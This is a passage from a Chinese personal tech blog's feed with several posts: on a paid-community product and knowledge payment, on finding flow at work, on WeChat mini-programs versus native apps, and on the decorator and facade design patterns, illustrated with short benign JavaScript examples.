          
          <category> 工具 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识付费，小密圈能走多远？</title>
      <link href="/blog/2017/02/22/secret-circle-prospects/"/>
      <url>/blog/2017/02/22/secret-circle-prospects/</url>
      
        <content type="html"><![CDATA[<blockquote><p>实名反对，以下部分观点，虽然都是自己说的…</p></blockquote><p>首先需要明确，小密圈是个什么东西。小密圈，它是一个工具，连接粉丝的工具，连接社群的工具。这个工具可以给社群中的人带来价值（知识、人脉、娱乐等），也可以给工具的使用者带来利益（财富回报、知识沉淀和整理、满足感、影响力等）。</p><p><img src="/../blogimgs/2017/02/22/6c0378f8gy1fczncajxtcj20p00dw0vs.jpg" alt="https://unsplash.com/search/new?photo=RokFUDqlTIo"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fczncajxtcj20p00dw0vs">--></p><span id="more"></span><p>谁能够做「小密圈」呢？微信、微博、知乎、得到等这些平台都可以做，他们为何不做？我就不高谈阔论了（其实我也不知道 XD），可能不久之后在这些大平台上也会有同类产品出来，然后大家就会四处围观各平台疯狂地圈大V，大V带动小V，小V带动人民群众，开启繁华的互联网雪崩式的知识付费时代，以后不花钱可能还真看不到特别有营养的分享了 。</p><p>两个月前我也开了一个圈子，每天投入大约一个小时运维，目前有了四百多个付费用户，故而对这类产品有点感触，下面来浅薄地聊聊题主的两个问题（观点略带趋向性，稍许片面）。</p><h3 id="像小密圈这样的粉丝经济能走多远？"><a href="#像小密圈这样的粉丝经济能走多远？" class="headerlink" title="像小密圈这样的粉丝经济能走多远？"></a>像小密圈这样的粉丝经济能走多远？</h3><p>我觉得，很远。但是题主这里用到的「粉丝经济」，我是不赞同的。上面我提到了，小密圈是一个工具，工具可以给圈子中所有的人带来价值，大多数情况下并不是因为你粉&#x2F;关注了某某才入圈，而是因为某某能产生对我有价值的内容，并且我曾看到过某某分享了这般内容，我信任某某，就像下面两个场景：</p><ul><li>如果你是一条单身狗，看到了一个可能帮你追到女神的小密圈，你进还是不进，你得犹豫下吧？</li><li>如果你是个技术菜鸟找工作而苦苦不得，看到了一个技术大神给你每天普及领域知识，还时而告知些面试的技巧，一年收费才一百多块，你进还是不进，你也得犹豫下吧？</li></ul><p>这个社会看似是价值驱动，但是从个体上表现出来却是利益驱动居多。圈子成员期望得到自己想要的，而圈主正好可以提供这样的服务，这种互利互惠的双赢产品，他为何就不能走得久远呢？</p><p>回到产品本身，小密圈有两招使得好。首先，价格最低限制在 50 块，这一点可以过滤不少不愿意付费的用户，同时给那些犹豫不决最后付费的同学一个警示，「这是你付过钱的圈子，你需要在这里收获点什么，不然你就亏了」，这一举动也会让圈主产生压力，进而不断提升分享的质量。然后就是圈子的经营时长，最短设置为一年，圈主有能力经营圈子，也有能力拉用户入圈，一年时间，圈主可以给小密圈带来几百甚至上千的付费用户，这些付费用户至少在这里活跃一年时间，而这一年内不知道又有多少新的圈子产生。这种周而复始的用户积淀，让他走得久远产生了可能。</p><p>从社会关系来看，小密圈拉近了一帮志同道合的人的距离，他们在一起有很多共同的话题，遇到的类似的疑惑，存在着同样的成长瓶颈。很多人平时接触不到大V，但是一百块钱就可以解决这个问题；很多人缺乏技术交流，但是一百块钱就让他们看到了一个崭新的世界，至少，比他工作的氛围要浓厚。这种和谐的社会群体关系也能为圈子的久远画上一个感叹号！</p><p>有人说这不就是收费的 QQ 群和微信群么，其实不然。小密圈做了两件事情，过滤了一群水军，同时提供了知识沉淀的工具，而且还提供了一个私密的环境，让付费的人产生了收获了内容而别人没机会的满足感。需要注意的是，愿意付费的人群只会是 4% 左右，剩下的 96% 对这种付费社群持观望、神往或鄙视态度。</p><p>下面用一组数据给大家展示下，小密圈能走多远，也顺便看看付费和免费的区别：</p><p>目前小密圈的付费用户人均支付额 143.8 元。单日付费最高时二十多万，然后就是现在每天至少新增一个主题的圈子，也就是比较活跃的圈子将近有一千个。</p><p>付费圈大概占了 20%，需要审核的私密圈 大概占了 30%，剩下的 50% 是免费圈，但免费圈的活跃度最低——估计只有 10% 左右是认真运营的，剩下 40% 不客气的说是用户为了测试建的。<br>数据来源：小密圈：付费社群和小程序的“高级”玩法|浑水课堂干货</p><h3 id="进入对应的圈子主要出发点又是什么？"><a href="#进入对应的圈子主要出发点又是什么？" class="headerlink" title="进入对应的圈子主要出发点又是什么？"></a>进入对应的圈子主要出发点又是什么？</h3><p>这个问题，我的理解是，圈主如何把人召唤到圈子，而被召唤者为什么愿意加入圈子。</p><p>后者没什么好回答的，简单来说入圈的人愿意为内容付费，就这么简单。而圈主如何召唤，我可以稍微分享下我的思路。</p><p>首先要明确， 为什么样的人提供什么样的服务。就拿我自己的圈子而言，命名为「前端进阶」，我服务的人群很好定位，主要是处在中小公司的前端工程师，他们工作中遇到场景有限，技术交流氛围有限，期望通过大公司或者看似牛x的人学习到一些平时不了解的东西，希望这些人能够帮助自己规划学习方案，提升个人能力，解答工作中的疑惑。所以我要做的事情就是找到他们在哪些方面存在短板，需要怎样的具体的帮助，然后告诉他们我能够在一定程度帮助你。召唤如此简单。</p><p>小密圈属于消耗型的工具，它会不断地消耗圈主的知识、精力，这对圈主来说如何持续运维是一件值得长期思考的问题。纯干货分享会消耗地很快，圈主能力再强，能够产出的内容也很难维持一年时间。</p><p>这个时候需要有节奏的提供服务。我观察了下圈子的活跃度，四百多人的付费人群，活跃度并没有想象中的那么高，每周长期活跃人群不足 25%，我完全可以理解这个比例。平时买一堆书，正经看完的没几本，小密圈其实就是一本「书」，用户买过来之后，读或是不读，全凭心情、全看场景。有几个朋友跟我说，每天上班坐地铁的时候必看我的小密圈。每个人的时间都很宝贵，圈子需要做的事情就是整理内容，让入圈的人可以用最短的时间完成阅读；或者高效、及时地回答提问者的疑问。而不是一味的分享内容，看到啥都往圈子里塞，几乎不会有人全看，意义也不大。</p><p>所以我在圈子里，定下了几个专题，每个专题持续一到两个月的时间，不停地讲，持续的说，把一个知识点讲透，怎么着用户也能耳濡目染学到点东西。用产品的思维来整理内容。</p><hr><p>题图：<a href="https://unsplash.com/search/new?photo=RokFUDqlTIo">Anthony DELANOIX</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小密圈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>心流，从工作中找到快感</title>
      <link href="/blog/2017/02/19/make-your-heart-comfortable/"/>
      <url>/blog/2017/02/19/make-your-heart-comfortable/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blogimgs/2017/02/19/6c0378f8gy1fcw3j2r63aj20p00dw0uc.jpg" alt="unsplash"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fcw3j2r63aj20p00dw0uc">--></p><p>今天学到一个词，心流，指的是当人们沉浸在当下的某件事情时，全神贯注、全情投入并享受其中从而体验到的一种幸福的精神状态。</p><span id="more"></span><p>在公司，我们经常做不喜欢的事情，如何将不喜欢的项目变成幸福感的源泉？</p><p>首先你要找到项目中的有挑战、有快感的部分，它会让你产生幸福感。做这些事情必须有足够的技巧，尝试从其他项目成员身上找到解决这些问题的规律。</p><p>然后，去承担更多的责任，并不断对任务难度做评估和微调，对于简单的任务，适当增加难度，而对于偏难的任务，主动学习，补充营养，提升自己，在承担责任的过程中寻求一个不断向上的平衡。</p><p>最后，明确自己的目标，并寻求反馈。目标越明确，在调整平衡时方向感越强，事情做起来越得心应手。寻求反馈能够减少碰壁，产生更多有用功。</p><p>慢慢的，心流就在这个项目中产生了。</p><hr><p>题图：Kevin Fernandez</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊设计模式（4）：装饰模式</title>
      <link href="/blog/2017/02/14/the-decorator-pattern-in-design-patterns/"/>
      <url>/blog/2017/02/14/the-decorator-pattern-in-design-patterns/</url>
      
        <content type="html"><![CDATA[<p>Decorator Pattern，中文名为装饰者模式，这个模式思想很简单，但是特别容易把代码搞复杂，它包含四个重要角色：</p><ul><li><code>Component</code>, 抽象构件</li><li><code>ConcreteComponent</code>, 具体构件</li><li><code>Decorator</code>, 抽象装饰类</li><li><code>ConcreteDecorator</code>, 具体装饰类</li></ul><p><img src="/../blogimgs/2017/02/14/6c0378f8gy1fcppr5hep8j20p00dwjui.jpg" alt="https://unsplash.com/search/decoration?photo=WjqEDAsn_nI"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fcppr5hep8j20p00dwjui">--></p><span id="more"></span><p>这几个角色很容易把人搞懵，所以在使用这个模式之前要彻底理解它。ECMAScript 2017 中增加了修饰器，它从语法层面帮掩盖了 <code>Decorator</code> 装饰类和 <code>Component</code> 构件，极大程度方便了我们理解装饰器：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">activate</span>(<span class="params">target</span>) &#123;</span><br><span class="line">    target.<span class="property">barkable</span> = <span class="literal">true</span>;</span><br><span class="line">    target.<span class="property">runnable</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@activate</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EDog</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">EDog</span>.<span class="property">barkable</span>, <span class="title class_">EDog</span>.<span class="property">runnable</span>); <span class="comment">// true true</span></span><br></pre></td></tr></table></figure><p>上面的代码很简单，<code>activate</code> 是一个开关装饰类，通过它激活了 <code>EDog</code> —— 不会跑、不会叫的电子狗，让它具备了 <code>bark</code> 和 <code>run</code> 能力。</p><h3 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h3><p>过年回来后业务压力不大，小苏让小喜抽空做一个代码发布平台，帮助团队迁移代码发布平台，之前的前端静态代码是通过 SVN 管理和发布的，现在需要迁移到 Git 上去，小苏说这是个重任。小喜暗自欣喜，这 TM 也太简单了。</p><p>使用开源的 gitlab 搭建了一个代码管理平台，然后在 gitlab 上添加了钩子，每次有代码推送时，向小喜的代码平台发送一个请求，小喜便直接执行 <code>publish</code> 操作：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CodePlatform</span> &#123;</span><br><span class="line">    <span class="title function_">publish</span>(<span class="params">gitInfo</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">scpCodeFromGitlabToOnline</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直接将 gitlab 代码直接复制到线上机器</span></span><br><span class="line">    <span class="title function_">scpCodeFromGitlabToOnline</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不久之后代码的构建从线下迁移到了线上，要求代码发布时先使用构建服务器处理，于是小喜给 <code>CodePlatform</code> 增加了一项功能：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CodePlatform</span> &#123;</span><br><span class="line">    <span class="title function_">publish</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">transferCodeToBuilderServer</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">scpCodeFromGitlabToOnline</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">scpCodeFromGitlabToOnline</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="comment">// 将代码扔到构建服务器</span></span><br><span class="line">    <span class="title function_">transferCodeToBuilderServer</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随着团队工程化程度越来越高，很多线下操作流程渐渐搬移到了线上进行云处理，后续又增加了测试服务器、日志服务器、安全监测服务器等，结果小喜的代码变成了这样：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CodePlatform</span> &#123;</span><br><span class="line">    <span class="title function_">publish</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// publish 的逻辑越来越重</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">scpCodeFromGitlabToOnline</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">transferCodeToBuilderServer</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">transferCodeToLogServer</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">transferCodeToSecureServer</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">transferCodeToTestServer</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小喜怎么也没想到，发布一个仓库在 <code>CodePlatform</code> 需要走这么多流程，这个类的职责越来越多，代码体积也越来越庞大，此时的小喜有点苦恼。</p><p>有一次，小喜学习 ES7 相关知识，突然看到一个叫做 <code>Decorator</code> 的东西，想了想似乎可以在项目中用一下。这不用不知道，一用吓一跳，原来之前的代码还可以这样架构：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 为所有的服务添加日志服务</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogService</span> &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> logger = <span class="keyword">new</span> <span class="title class_">LogService</span>();</span><br><span class="line"></span><br><span class="line">@<span class="title function_">logger</span>(<span class="string">&#x27;build&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BuildService</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_">logger</span>(<span class="string">&#x27;secure&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureService</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_">logger</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestService</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>首先将服务抽离出来，然后：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> builder = <span class="keyword">new</span> <span class="title class_">BuildService</span>();</span><br><span class="line"><span class="keyword">const</span> securer = <span class="keyword">new</span> <span class="title class_">SecureSevice</span>();</span><br><span class="line"><span class="keyword">const</span> tester = <span class="keyword">new</span> <span class="title class_">TestService</span>();</span><br><span class="line"></span><br><span class="line">@securer</span><br><span class="line">@<span class="title function_">logger</span>(<span class="string">&#x27;CodePlatform&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CodePlatform</span> &#123;</span><br><span class="line">    @builder</span><br><span class="line">    @tester</span><br><span class="line">   <span class="title function_">publish</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让 CodePlatform 的代码先走一遍 <code>securer</code>，在发布的时候走一遍 <code>tester</code> 和 <code>builder</code>，代码结构瞬间变得清晰了很多。</p><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>我们经常在代码中干这件事情，尤其是业务代码。一些临时需求，为了图方便、图快，直接在原有的基础上增加几个方法，然后在执行入口位置添加补丁，时间长了之后，维护起来十分吃力，这也是为什么在业务交接时大家相互吐槽代码的主要原因之一。很多人拿到代码的第一感觉就是，写这代码的人是傻x，这代码得重构。</p><p>上面的问题在于 <code>CodePlatform</code> 承担了太多的职责，最后这个类变得特别繁忙，加上代码量多了之后，阅读难度提升了。事实上，测试、监控、日志、安全等都是发布之前对代码的流程化操作，<code>CodePlatform</code> 的核心功能是 <strong>发布代码</strong>，其他的操作都可以看做对待发布代码的装饰。</p><p>JS 中 <code>Decorator</code> 语法糖十分容易理解，它既可以装饰类也可以装饰类的成员方法。所以我就没把这个模式的具体实现写出来，感兴趣的可以到网上搜索下。</p><h3 id="装饰模式"><a href="#装饰模式" class="headerlink" title="装饰模式"></a>装饰模式</h3><p>对类做职能补充有几种方式：</p><ul><li>继承，让继承类拥有父类的所有能力，并自我扩展</li><li>关联，将两个功能集进行合并</li><li>修改父类（基类），这是当然不推荐的方案</li></ul><p>**装饰模式，动态地给一个对象增加一些额外的职责 ( Responsibility )**，就增加对象功能来说，装饰模式比生成子类实现更为灵活。</p><p>装饰者模式可以在运行时给对象动态地增加更多的职责，它属于通过建立关联方式来扩充对象的能力。从上面的例子中看得出来，CodePlatform 在装饰前后基本看不出差异，这就是这个模式的特点。</p><h3 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="https://zh.wikipedia.org/zh-cn/%E4%BF%AE%E9%A5%B0%E6%A8%A1%E5%BC%8F">Wikipedia - 修饰模式</a></li><li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/structural_patterns/decorator.html">结构型模式 » 装饰模式</a></li><li><a href="http://es6.ruanyifeng.com/#docs/decorator">修饰器</a></li></ul><hr><p>题图：<a href="https://unsplash.com/search/decoration?photo=WjqEDAsn_nI">Jeffrey Wegrzyn</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 装饰模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>因小程序卸载的软件，重新安装回来了么？</title>
      <link href="/blog/2017/02/13/why-reinstall-software-uninstall-when-xcx/"/>
      <url>/blog/2017/02/13/why-reinstall-software-uninstall-when-xcx/</url>
      
        <content type="html"><![CDATA[<p>微信几波宣传攻势后，小程序在 16 年顺利成为了互联网的一个新关键词，它在商业圈和技术圈都掀起了一阵波澜。而有意思的是，它时冷时热，到最后吃瓜群众们也司空见惯了。</p><p><img src="/../blogimgs/2017/02/13/6c0378f8gy1fcojcvx2g7j20p00dw41q.jpg" alt="https://unsplash.com/search/ant?photo=dSM6qcdS7Hk"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fcojcvx2g7j20p00dw41q">--></p><span id="more"></span><p>小程序让中低配手机人群欢喜了一把，删除几个软件可以省下几百兆的空间；而如今这些删除的软件，你是否又安装了回来？</p><h3 id="删除了哪些软件？"><a href="#删除了哪些软件？" class="headerlink" title="删除了哪些软件？"></a>删除了哪些软件？</h3><p>从重要性和使用频度，可以将软件划分为四类：</p><ul><li>低频使用且不重要，如数独游戏、中国法律</li><li>低频使用且重要，如饿了么、淘票票</li><li>高频使用且不重要</li><li>高频使用且重要，如高德地图、微博、知乎</li></ul><p>高频使用的软件，对用户来说一般都是重要的，至少是不太会删除的，故第三个分类占比稍低。最有可能被删除的软件是低频使用软件，手机上存在一堆「低频使用且不重要」软件的用户不会很在意剩余空间的问题，因为他们的手机空间一般都很大，而这些软件被删除后，不管有没有对应的小程序，用户都不会有啥感知。</p><p>而对于「低频使用且重要」的软件，被删除后，一旦有再次使用的需要，用户感知会十分强烈；这类软件往往也被删得比较多，由于使用频率低，只要小程序上能用，即便打开路径深一些、使用体验差一点，用户也能接受。比如猫眼、今日头条、网易新闻、饿了么、星巴克、滴滴打车等，功能简单的纯查询、偏前端展现的生活资讯类软件。</p><h3 id="为什么又装回来一些删掉的软件？"><a href="#为什么又装回来一些删掉的软件？" class="headerlink" title="为什么又装回来一些删掉的软件？"></a>为什么又装回来一些删掉的软件？</h3><p>装回来的软件肯定不会是淘宝、百度地图、知乎或者某一款手游，毕竟人家也不会跑到微信上搞个小程序蹭这点流量；涉及到实时通讯、CPU 密集型和安全要求较高的场景，比如地图、游戏、网银、社交等软件，都不太会上小程序。</p><p>下面我列举下，小程序较原生软件有哪些短板：</p><ul><li><strong>无消息提示</strong>，原生软件会通过图标上的未读消息，以及不定时的后台推送，提示用户该打开看看了，而小程序目前还没有这个能力；</li><li><strong>程序打开路径太深</strong>，原生软件在界面上只需要一次点击就可以进入，而小程序需要 <code>点开微信-&gt; 点开 Tab -&gt; 点开小程序 -&gt; 点开软件</code> 四个步骤，Android 用户稍好一点；</li><li><strong>产品功能完整度缺失</strong>，不管是原生软件还是小程序都是需要投入人员开发的，公司资源有限，而小程序坑有多，所以公司不会把所有的产品功能搬运到小程序上，尤其是那些能够增加用户粘性的 SNS 相关功能，交互多、开发成本巨高；</li><li><strong>版本迭代后，产品功能丢失</strong>，由于小程序不是产品的主要流量来源，在产品迭代期间，极有可能在小程序上丢失很多产品新特性，我们在小程序上看到的基本是产品上一个形态，感兴趣的可以拿几个应用对象下就知道了；</li><li><strong>切换到后台的能力</strong>，小程序有切换到后台的能力，但是太弱了，只能让一个小程序固定在聊天版面上部，而原生软件可以通过系统提供的能力常驻，并且能够在多个软件之间友好地切换；</li><li><strong>小程序使用时微信聊天能力丧失</strong>，我测试了下，玩小程序的时候，微信消息是不会提醒的；而原生软件支持我们在看电影的时候接受微信消息，并且可以快捷回复。</li></ul><p>小程序虽然轻便，但是要把性能做到极致、让用户流量损耗最小，需要投入较原生软件多出一到两倍的开发成本。慢慢地，因为长期养成的软件使用习惯，那些被删除的软件又悄然回到了手机，这就是小程序的命运。</p><p>不过，我相信，随着 Google  PWA 的推广和发展，小程序在 Android 上还是有希望突起的。</p><hr><p>题图：<a href="https://unsplash.com/search/ant?photo=dSM6qcdS7Hk">https://unsplash.com/search/ant?photo=dSM6qcdS7Hk</a></p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊设计模式（3）：门面模式</title>
      <link href="/blog/2017/02/07/the-facade-pattern-in-design-patterns/"/>
      <url>/blog/2017/02/07/the-facade-pattern-in-design-patterns/</url>
      
        <content type="html"><![CDATA[<p>Facade，中文译为门面、外观，所以本文要讲的 Facade Pattern 翻译时经常看到有两个名字，门面模式和外观模式。</p><p><img src="/../blogimgs/2017/02/07/6c0378f8gy1fchm1y9bubj20p00dw42z.jpg" alt="https://unsplash.com/search/facade?photo=5NArdqS7FW4 by Chris Barbalis"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fchm1y9bubj20p00dw42z">--></p><span id="more"></span><p>这是一个在 JavaScript 中被经常用到的设计模式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">modA</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">modB</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 门面模式实例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Facade</span> &#123;</span><br><span class="line">    <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">        modA.<span class="title function_">initialize</span>();</span><br><span class="line">        modB.<span class="title function_">init</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>) &#123;</span><br><span class="line">        modA.<span class="title function_">start</span>();</span><br><span class="line">        modB.<span class="title function_">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>modA</code> 和 <code>modB</code> 是客户端运行的两个依赖系统，例子中通过 <code>Facade</code> 类做了简单封装，客户端便可以使用少量代码快捷启动两个子系统，这里的 <code>Facade</code> 就是两个子系统的门面，客户端跟门面而不会直接与子系统打交道。</p><p>上面的例子比较抽象，还是有些晦涩的，下面看一个实际的场景。</p><h3 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h3><p>小喜负责的业务增加了一些社交元素，不久之后业务方给小喜提了一个需求，要求在某类文章下方增加一个赞赏按钮，用户点击按钮时，调用 Z 平台的接口付款，然后将操作记录到后端，最后发送一个统计埋点，需要三天内上线。</p><p>小喜笑了笑，心里开心道：就这点需求，哪用得着三天，给我俩小时就够了：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">payWithZFB</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">request</span>(<span class="string">&#x27;interface-a&#x27;</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">addRecord</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendTrack</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">Zan</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 调用 Z 平台接口，进行支付操作</span></span><br><span class="line">    <span class="keyword">let</span> record = <span class="keyword">await</span> <span class="title function_">payWithZFB</span>();</span><br><span class="line">    <span class="comment">// 调用后端接口，记录日志</span></span><br><span class="line">    <span class="keyword">let</span> track = <span class="keyword">await</span> <span class="title function_">addRecord</span>(record);</span><br><span class="line">    <span class="comment">// 调用埋点接口，发送埋点信息</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sendTrack</span>(track);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上，小喜找 Z 平台、后端和日志平台的同学要接口就花了一整天，并且 <code>pageWithZFB</code>、<code>addRecord</code> 和 <code>sendTrack</code> 三个函数的实现都十分复杂，各种权限验证、安全验证等，小喜做完这个需求内心是崩溃的。</p><p>随着业务规模的扩大，SNS 相关需求量有所增加，其他业务上陆续也开始使用赞赏功能。同组的小天收到了类似的需求，但小天并不知道小喜之前做过，同样花了一天时间，采用了类似的方式实现了功能。</p><p>一段时间后， Z 平台那边说需要提升安全防护，要求开发者对接口做调整，需要将 <code>interface-a</code> 调整为 <code>interface-b</code>，小喜和小天都收到了这个需求，他们相互瞪了对方一眼，然后默默地回去修改了。</p><p>小苏在进行团队代码 review 的时候，看到了这个问题，为了减少团队在这一块的开销，他让小喜使用 NodeJS 做了一层封装，代码变动其实并不大，从客户端调用 HTTP 接口，变成了 Node 调用 HSF 接口：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Facade</span> &#123;</span><br><span class="line">    zan () &#123;</span><br><span class="line">        <span class="keyword">let</span> record = <span class="keyword">await</span> <span class="title function_">payWithZFB</span>();</span><br><span class="line">        <span class="keyword">let</span> track = <span class="keyword">await</span> <span class="title function_">addRecord</span>(record);</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sendTrack</span>(track);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后小喜和小天在客户端的调用都变成了：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> facade = <span class="keyword">new</span> <span class="title class_">Facade</span>();</span><br><span class="line">facade.<span class="title function_">zan</span>();</span><br></pre></td></tr></table></figure><p>这个调整带来的很大的便捷，不管 Z 平台、后端和日志平台的规则如何变化，小喜只需要修改 Node 提供的 <code>Facade</code> 服务就能解决问题，业务上不需要做任何发布。</p><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>这个问题应该相当明确，这个模式也很好理解。业务需求经常会牵涉到多个平台的协作，协作就意味着频繁的交流和沟通，最后演变的结果便是：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> 同学：<span class="selector-tag">hi</span>，请问如何使用 <span class="selector-tag">Z</span> 平台的支付接口呀？</span><br><span class="line"><span class="selector-tag">B</span> 同学：<span class="selector-attr">[自动回复]</span> 询问支付接口请回复 <span class="number">1</span>，中午请我吃饭请回复 <span class="number">2</span>。</span><br><span class="line"><span class="selector-tag">A</span> 同学：<span class="number">1</span></span><br><span class="line"><span class="selector-tag">B</span> 同学：<span class="selector-attr">[自动回复]</span> 文档链接：<span class="selector-tag">http</span>:<span class="comment">//z/interface</span></span><br></pre></td></tr></table></figure><p>平台通过机器人解决了客服问题，但是使用者却不得不一遍又一遍地阅读粗糙无比的文档（好像有点跑题了，我们回来继续解析问题）。</p><p><code>Facade</code> 隔离了客户端与三个平台之间的通信，尽管客户端依然还可以跳过 <code>Facade</code> 与平台交流，一般情况下不会这么去做，但也不排除这种情况，比如客户端和 Z 平台之间的认证禁止间接进行，那么客户端的调用就会变成：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> facade = <span class="keyword">new</span> <span class="title class_">Facade</span>();</span><br><span class="line"><span class="title function_">authZFB</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    facade.<span class="title function_">zan</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>门面模式还是允许客户端去直接操作子系统的，这也说明了这个模块比较灵活。</p><h3 id="门面模式"><a href="#门面模式" class="headerlink" title="门面模式"></a>门面模式</h3><p><strong>门面模式，要求一个子系统的外部与其内部的通讯必须通过一个统一的对象进行。门面模式提供一个高层次的接口，使得子系统更易于使用。</strong></p><p>引入门面模块，可以将子系统之间的通信和相互依赖达到最小，从而降低整个系统的复杂度，也很大程度上提高了客户单使用的便捷性，客户端无需关系子系统的实现细节，通过门面角色便可以完成功能的调用。</p><p>门面模式相对复杂的使用方式是，提供抽象的门面类，然后根据配置文件生成具体的门面类，这种模式用的比较广泛，也是值得提倡的。</p><h3 id="拓展阅读"><a href="#拓展阅读" class="headerlink" 